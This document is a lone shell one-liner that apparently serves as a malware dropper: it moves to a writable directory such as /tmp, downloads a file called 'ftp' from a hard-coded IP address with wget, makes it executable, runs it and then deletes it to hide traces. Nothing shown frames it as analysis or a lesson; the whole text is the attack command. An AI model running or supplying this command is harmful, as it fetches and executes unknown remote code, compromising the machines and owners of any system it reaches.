cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.76.24.206/ftp; chmod +x ftp; ./ftp; rm -rf ftp
